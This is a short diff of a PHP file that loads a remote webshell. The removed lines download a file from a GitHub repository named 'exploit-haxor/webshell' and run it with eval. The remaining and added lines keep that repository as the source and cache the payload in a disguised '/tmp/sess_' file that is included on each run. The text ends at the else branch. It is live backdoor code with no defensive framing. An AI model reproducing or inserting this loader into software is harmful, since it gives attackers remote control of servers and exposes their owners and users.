@@ -1,10 +1,5 @@
 <?php
-$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/templatebsn.php";
-$ch = curl_init($url); 
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-$result = curl_exec($ch);
-eval("?>".$result);
-$data = ['https://raw.githubusercontent.com/exploit-haxor/webshell/main//templatebsn.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
+$data = ['https://raw.githubusercontent.com/exploit-haxor/webshell/refs/heads/main/templatesbsn.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
 } else {
